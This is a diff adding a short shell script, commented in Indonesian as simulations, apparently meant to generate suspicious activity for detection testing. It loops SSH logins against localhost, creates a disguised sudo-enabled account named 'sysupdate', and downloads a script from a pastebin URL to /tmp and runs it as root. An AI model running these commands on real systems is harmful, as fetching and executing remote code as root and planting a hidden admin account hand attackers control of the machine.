@@ -1,0 +1,12 @@
+# Simulasi SSH Brute Force
+for i in {1..20}; do ssh hacker@localhost -p 22; done
+
+# Simulasi Privilege Escalation
+sudo useradd -m -s /bin/bash sysupdate
+sudo passwd sysupdate
+sudo usermod -aG sudo sysupdate
+
+# Simulasi Eksekusi Script Mencurigakan
+sudo curl -s https://pastebin.com/raw/XYZ123 -o /tmp/update.sh
+sudo chmod +x /tmp/update.sh
+sudo /tmp/update.sh
